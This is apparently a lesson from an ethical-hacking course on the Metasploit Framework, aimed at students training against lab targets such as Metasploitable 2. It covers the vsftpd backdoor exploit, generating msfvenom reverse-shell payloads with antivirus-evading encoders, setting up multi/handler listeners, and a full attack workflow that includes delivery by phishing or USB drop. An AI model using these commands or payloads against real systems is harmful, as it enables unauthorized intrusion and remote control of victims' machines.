# Day 16 — Exploitation: Metasploit Framework

> 📚 Part of the **"Learn Ethical Hacking in 30 Days"** series.  
> Previous: [Day 15 — Reverse Shell, Bind Shell & Payloads](#) | Next: [Day 17](#)

---

## 📋 Table of Contents

1. [What is Metasploit?](#1-what-is-metasploit)
2. [Metasploit Module Types](#2-metasploit-module-types)
3. [Starting Metasploit](#3-starting-metasploit)
4. [Core Commands](#4-core-commands)
5. [Finding Exploits with search](#5-finding-exploits-with-search)
6. [Using an Exploit Module](#6-using-an-exploit-module)
7. [Using Auxiliary Modules](#7-using-auxiliary-modules)
8. [Generating Payloads with msfvenom](#8-generating-payloads-with-msfvenom)
9. [Setting Up a Listener with multi/handler](#9-setting-up-a-listener-with-multihandler)
10. [Full Attack Workflow](#10-full-attack-workflow)
11. [Quick Reference Cheat Sheet](#11-quick-reference-cheat-sheet)

---

## 1. What is Metasploit?

**Metasploit Framework** is the world's most widely used penetration testing framework, created by **HD Moore** and maintained by **Rapid7**.

It provides a unified platform for:
- Finding and running exploits against vulnerable systems
- Generating payloads for various platforms
- Post-exploitation activities (privilege escalation, credential dumping, etc.)
- Auxiliary scanning and enumeration

**Key stats (Metasploit 6.4.x):**

| Module Type | Count |
|-------------|-------|
| Exploits | 2,433 |
| Auxiliary modules | 1,253 |
| Post-exploitation modules | 428 |
| Payloads | 1,471 |
| Encoders | 47 |
| NOPs | 11 |
| Evasion modules | 9 |

---

## 2. Metasploit Module Types

| Module | Purpose | When to Use |
|--------|---------|-------------|
| **Exploit** | Code that abuses a vulnerability to gain access | During exploitation phase |
| **Auxiliary** | Scanning, enumeration, fuzzing — no exploitation | During recon/scanning phase |
| **Post** | Actions taken after gaining access (credential dump, keylogger, etc.) | After shell/meterpreter session |
| **Payload** | Code dropped on target to perform specific action (reverse shell, etc.) | Paired with exploits |
| **Encoder** | Obfuscates payloads to evade AV/EDR signatures | When AV is present |
| **NOP** | No-operation byte padding used in buffer overflow exploits | Buffer overflow attacks |
| **Evasion** | Bypass specific security software | When specific security tools are present |

### Module Details

**Auxiliary modules** replace standalone tools — instead of running a separate nmap or other scanner, you can use `auxiliary/scanner/ssh/ssh_version` directly in Metasploit.

**Post modules** handle everything after initial access:
- Dump password hashes
- Take screenshots
- Access webcam
- Install keyloggers
- Pivot to other systems

**NOPs** are used in buffer overflow exploits to pad payloads to a specific memory address. They fill space with "do nothing" instructions so the payload lands at the right offset.

---

## 3. Starting Metasploit

```bash
msfconsole
```

**On launch you'll see:**
```
       =[ metasploit v6.4.1-dev                          ]
+ -- --=[ 2433 exploits - 1253 auxiliary - 428 post      ]
+ -- --=[ 1471 payloads - 47 encoders - 11 nops          ]
+ -- --=[ 9 evasion                                      ]

msf6 >
```

> 💡 The `msf6 >` prompt means Metasploit is running and waiting for your commands.

---

## 4. Core Commands

| Command | Description |
|---------|-------------|
| `help` | Show all available commands |
| `search <term>` | Search for modules by keyword |
| `use <module>` | Select and load a module |
| `info` | Show detailed info about the selected module |
| `options` | Show configurable options for the current module |
| `show exploits` | List all exploit modules |
| `show auxiliary` | List all auxiliary modules |
| `show payloads` | List payloads compatible with current module |
| `show targets` | List available targets for current exploit |
| `show evasion` | List evasion modules |
| `set <OPTION> <value>` | Set an option value |
| `unset <OPTION>` | Clear an option value |
| `run` / `exploit` | Execute the current module |
| `back` | Go back to main msf prompt |
| `exit` | Exit Metasploit |
| `sessions` | List active sessions |
| `sessions -i <id>` | Interact with a session |

---

## 5. Finding Exploits with `search`

### Basic keyword search

```bash
search vsftpd
search vsftpd 2.3.4
search apache
search eternalblue
```

### Search by type

```bash
search type:exploit
search type:auxiliary
search type:post
```

### Search by platform

```bash
search platform:windows
search platform:linux
search platform:unix
```

### Combined search

```bash
search type:exploit platform:windows smb
search type:auxiliary ssh
```

### Example output

```
msf6 > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     No     vsftpd 2.3.2 DoS
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```

**Module rank meanings:**

| Rank | Meaning |
|------|---------|
| **Excellent** | Works reliably, no side effects |
| **Great** | Works, minimal side effects |
| **Good** | Works with some caveats |
| **Normal** | Works most of the time |
| **Average** | Hit or miss |
| **Low** | Rarely works |
| **Manual** | Requires manual interaction |

---

## 6. Using an Exploit Module

### Step 1: Load the module

```bash
# Method 1: Use full module name
use exploit/unix/ftp/vsftpd_234_backdoor

# Method 2: Use the number from search results
use 1
```

### Step 2: View module info

```bash
info
```

**Output includes:**
- Name, Module path
- Platform and architecture
- Rank and disclosure date
- Author
- Available targets
- Description
- References

### Step 3: View and set options

```bash
options
```

**Example output:**
```
Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s)
   RPORT   21               yes       The target port (default: 21)
```

```bash
# Set the target IP
set RHOSTS 192.168.29.150

# Set a different port if needed
set RPORT 21

# Verify settings
options

# Unset if needed
unset RHOSTS
```

### Step 4: Set a payload (if needed)

```bash
show payloads       # List compatible payloads
set payload <payload-name>
```

### Step 5: Set targets (if multiple)

```bash
show targets
set target <number>
```

### Step 6: Run the exploit

```bash
run
# or
exploit
```

---

## 7. Using Auxiliary Modules

Auxiliary modules perform scanning, enumeration, and other non-exploitation tasks.

### Finding auxiliary modules

```bash
search type:auxiliary ssh
search type:auxiliary scanner
```

### Example: SSH Version Scanner

```bash
# Search for the module
search type:auxiliary ssh version

# Load it
use auxiliary/scanner/ssh/ssh_version

# Set target
set RHOSTS 192.168.29.150

# Run
run
```

**Example output:**
```
[+] 192.168.29.150:22 - SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
[*] Scanned 1 of 1 hosts (100% complete)
```

### Other useful auxiliary modules

```bash
# Port scanner
use auxiliary/scanner/portscan/tcp

# SMB version scanner
use auxiliary/scanner/smb/smb_version

# FTP anonymous login
use auxiliary/scanner/ftp/anonymous

# HTTP directory scanner
use auxiliary/scanner/http/dir_scanner

# MySQL login brute force
use auxiliary/scanner/mysql/mysql_login
```

---

## 8. Generating Payloads with msfvenom

**msfvenom** is Metasploit's standalone payload generator (runs outside msfconsole).

### List all payloads

```bash
msfvenom -l payloads                          # All payloads
msfvenom -l payloads | grep windows           # Windows only
msfvenom -l payloads | grep linux             # Linux only
msfvenom -l payloads | grep meterpreter       # Meterpreter payloads
```

### Generate a Windows reverse HTTPS payload (staged)

```bash
msfvenom -p windows/meterpreter/reverse_https \
  LHOST=192.168.29.10 \
  LPORT=4444 \
  -f exe \
  -o windows_payload.exe
```

### msfvenom flag reference

| Flag | Description |
|------|-------------|
| `-p` | Payload to use |
| `LHOST=` | Attacker's IP (listener IP) |
| `LPORT=` | Attacker's port (listener port) |
| `-f` | Output format |
| `-o` | Output file name |
| `-e` | Encoder to use (AV evasion) |
| `-i` | Number of encoding iterations |
| `-l payloads` | List available payloads |
| `-l formats` | List output formats |
| `--smallest` | Generate smallest possible payload |

### Common output formats (`-f`)

| Format | Platform |
|--------|----------|
| `exe` | Windows executable |
| `elf` | Linux executable |
| `raw` | Raw shellcode |
| `war` | Java WAR (Apache Tomcat) |
| `jar` | Java JAR |
| `php` | PHP script |
| `py` | Python script |
| `ps1` | PowerShell script |
| `asp` | ASP web page |
| `aspx` | ASP.NET web page |

### Common payload examples

```bash
# Windows staged reverse shell (exe)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe

# Windows stageless reverse HTTPS shell (exe)
msfvenom -p windows/meterpreter_reverse_https LHOST=<IP> LPORT=4444 -f exe -o shell.exe

# Windows 64-bit staged reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell64.exe

# Linux reverse shell (elf)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php

# Python reverse shell
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=4444 -f raw -o shell.py

# With encoder (AV evasion)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

> ⚠️ **Set LHOST to YOUR (attacker's) IP** — the target connects back to this address.

---

## 9. Setting Up a Listener with multi/handler

Before delivering your payload, set up a listener in Metasploit to catch the incoming connection.

> ✅ **Always start the listener BEFORE sending the payload to the target.**

```bash
msfconsole

use exploit/multi/handler

# Set payload — MUST MATCH what you used in msfvenom
set payload windows/meterpreter/reverse_https

# Set your IP and port — MUST MATCH msfvenom settings
set LHOST 192.168.29.10
set LPORT 4444

# Start listening
exploit
# or
run
```

**When connection arrives:**
```
[*] Started HTTPS reverse handler on https://0.0.0.0:4444
[*] https://192.168.29.10:4444 handling request from 192.168.29.150
[*] Meterpreter session 1 opened

meterpreter >
```

You now have a **Meterpreter shell** on the target.

---

## 10. Full Attack Workflow

```
Step 1: Recon — nmap scan to find open ports and versions
  nmap -sV -p- 192.168.29.150

Step 2: Find exploit — search in Metasploit
  msfconsole
  search vsftpd 2.3.4

Step 3: Select and configure the exploit
  use exploit/unix/ftp/vsftpd_234_backdoor
  info                          ← read what it does
  options                       ← see what needs to be set
  set RHOSTS 192.168.29.150
  show payloads                 ← pick a compatible payload
  set payload <payload>

Step 4: (Optional) Generate standalone payload with msfvenom
  msfvenom -p windows/meterpreter/reverse_https \
    LHOST=192.168.29.10 LPORT=4444 -f exe -o payload.exe

Step 5: Set up listener (multi/handler)
  use exploit/multi/handler
  set payload windows/meterpreter/reverse_https
  set LHOST 192.168.29.10
  set LPORT 4444
  exploit                       ← start listening

Step 6: Deliver payload to target
  (phishing email, file upload, USB drop, etc.)

Step 7: Catch the session
  meterpreter >                 ← you're in!
```

---

## 11. Quick Reference Cheat Sheet

### Starting & Navigation
```bash
msfconsole                          # Start Metasploit
exit                                # Exit Metasploit
back                                # Return to main prompt
help                                # Show all commands
```

### Searching
```bash
search <keyword>                    # Keyword search
search type:exploit <keyword>       # Search exploits only
search type:auxiliary <keyword>     # Search aux modules only
search platform:windows <keyword>   # Filter by platform
```

### Module Usage
```bash
use <module-name>                   # Load a module
use <number>                        # Load by search result number
info                                # View module details
options                             # View/check options
set <OPTION> <value>                # Set an option
unset <OPTION>                      # Clear an option
show payloads                       # List compatible payloads
show targets                        # List available targets
run / exploit                       # Execute the module
```

### msfvenom Quick Build
```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <file>

# Examples:
msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf
msfvenom -p php/meterpreter_reverse_tcp LHOST=<ip> LPORT=4444 -f raw -o shell.php
```

### multi/handler Setup
```bash
use exploit/multi/handler
set payload <same-as-msfvenom>
set LHOST <your-ip>
set LPORT <your-port>
exploit
```

### Sessions
```bash
sessions                            # List active sessions
sessions -i 1                       # Interact with session 1
sessions -k 1                       # Kill session 1
background                          # Background current session (from meterpreter)
```

### Key Options Reference
```
RHOSTS  = Target IP (the machine you're attacking)
RPORT   = Target port
LHOST   = Your IP (attacker/listener IP)
LPORT   = Your port (attacker/listener port)
```

---

> ✅ **End of Day 16 Notes**  
> 📌 Next up: **Meterpreter** — what to do after getting a shell (post-exploitation)  
> 💡 Practice: Use Metasploit against Metasploitable 2 — try the vsftpd backdoor exploit  
> ⚠️ Only use on machines you own or have explicit written permission to test  
> 💬 Questions? Drop them in the comments!